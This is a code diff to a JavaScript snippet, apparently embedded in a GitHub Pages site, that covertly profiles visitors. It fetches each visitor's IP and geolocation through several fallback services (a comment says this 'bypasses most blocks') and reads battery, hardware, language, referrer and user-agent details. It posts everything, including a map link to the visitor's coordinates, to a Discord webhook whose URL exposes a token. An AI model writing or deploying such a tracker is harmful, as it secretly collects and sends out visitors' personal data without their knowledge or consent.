@@ -2,11 +2,23 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1497258562165145683/NuNnv3
 
 async function captureAndSend() {
     try {
-        // Fetch Geo Data using HTTPS provider (Essential for GitHub Pages)
-        const geoRes = await fetch('https://ipwho.is/');
-        const data = await geoRes.json();
+        // 1. Get IP first (Very reliable)
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const visitorIP = ipData.ip;
 
-        // Battery Info
+        // 2. Get Geo Data using the IP (Bypasses most blocks)
+        let geoData = {};
+        try {
+            const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
+            geoData = await geoRes.json();
+        } catch (e) {
+            console.warn("Primary geo failed, trying fallback...");
+            const fallback = await fetch(`https://freeipapi.com/api/json/${visitorIP}`);
+            geoData = await fallback.json();
+        }
+
+        // 3. Battery Info
         let batteryInfo = "Unknown";
         try {
             const battery = await navigator.getBattery();
@@ -14,23 +26,20 @@ async function captureAndSend() {
         } catch (e) {}
 
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        const connType = connection ? `${connection.effectiveType} (${connection.type || 'unknown'})` : "Unknown";
+        const connType = connection ? `${connection.effectiveType}` : "Unknown";
 
         const info = {
-            ip: data.ip || "Unknown",
-            city: data.city || "Unknown",
-            region: data.region || "Unknown",
-            country: data.country || "Unknown",
-            isp: data.connection?.isp || data.isp || "Unknown",
-            zip: data.postal || "Unknown",
-            lat: data.latitude || "0",
-            lon: data.longitude || "0",
+            ip: visitorIP,
+            city: geoData.city || geoData.cityName || "Unknown",
+            region: geoData.region || geoData.regionName || "Unknown",
+            country: geoData.country_name || geoData.countryName || geoData.country || "Unknown",
+            isp: geoData.org || geoData.isp || "Unknown",
+            zip: geoData.postal || geoData.zip || "Unknown",
+            lat: geoData.latitude || geoData.lat || "0",
+            lon: geoData.longitude || geoData.lon || "0",
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
-            languages: navigator.languages.join(', '),
-            screenRes: `${window.screen.width}x${window.screen.height}`,
-            windowSize: `${window.innerWidth}x${window.innerHeight}`,
             cores: navigator.hardwareConcurrency || "Unknown",
             ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
             battery: batteryInfo,
@@ -42,22 +51,19 @@ async function captureAndSend() {
         };
 
         const payload = {
-            username: "GitHub Deployment Logger",
+            username: "Live Intelligence Logger",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/25/25231.png",
             embeds: [{
-                title: "🚀 Visitor Intelligence (Live)",
-                description: `Visitor detected on GitHub Pages site.`,
+                title: "🚀 Deep Analysis - Live Result",
                 color: 0x00f2ff,
                 fields: [
-                    { name: "🌐 Network & ISP", value: `**IP:** \`${info.ip}\`\n**ISP:** ${info.isp}\n**Conn:** ${info.connection}`, inline: false },
-                    { name: "📍 Location", value: `**Country:** ${info.country}\n**State:** ${info.region}\n**City:** ${info.city}\n**ZIP:** ${info.zip}\n**Coords:** [${info.lat}, ${info.lon}](https://www.google.com/maps?q=${info.lat},${info.lon})`, inline: true },
-                    { name: "💻 Hardware", value: `**CPU Cores:** ${info.cores}\n**RAM:** ${info.ram}\n**Battery:** ${info.battery}\n**GPU:** ${info.gpu}`, inline: true },
-                    { name: "🌍 Environment", value: `**Timezone:** ${info.timezone}\n**Lang:** ${info.language}\n**All Langs:** ${info.languages}`, inline: false },
-                    { name: "🖥️ Display", value: `**Screen:** ${info.screenRes}\n**Window:** ${info.windowSize}`, inline: true },
-                    { name: "🔗 Source", value: `**Referrer:** ${info.referrer}`, inline: true },
-                    { name: "🕵️ Full User Agent", value: `\`\`\`${info.userAgent}\`\`\`` }
+                    { name: "🌐 Network", value: `**IP:** \`${info.ip}\`\n**ISP:** ${info.isp}\n**Conn:** ${info.connection}`, inline: false },
+                    { name: "📍 Location Details", value: `**Country:** ${info.country}\n**State:** ${info.region}\n**City:** ${info.city}\n**Maps:** [View on Map](https://www.google.com/maps?q=${info.lat},${info.lon})`, inline: true },
+                    { name: "💻 Hardware", value: `**CPU:** ${info.cores} Cores\n**RAM:** ${info.ram}\n**Battery:** ${info.battery}\n**GPU:** ${info.gpu}`, inline: true },
+                    { name: "🌍 Other", value: `**Timezone:** ${info.timezone}\n**Lang:** ${info.language}\n**Ref:** ${info.referrer}`, inline: false },
+                    { name: "🕵️ Agent", value: `\`\`\`${info.userAgent}\`\`\`` }
                 ],
-                footer: { text: `GitHub Session | ${info.timestamp}` }
+                footer: { text: `GitHub Pages Deployment | ${info.timestamp}` }
             }]
         };
 
@@ -68,7 +74,7 @@ async function captureAndSend() {
         });
 
     } catch (error) {
-        console.error("Capture failed:", error);
+        console.error("Final capture failed:", error);
     }
 }
 
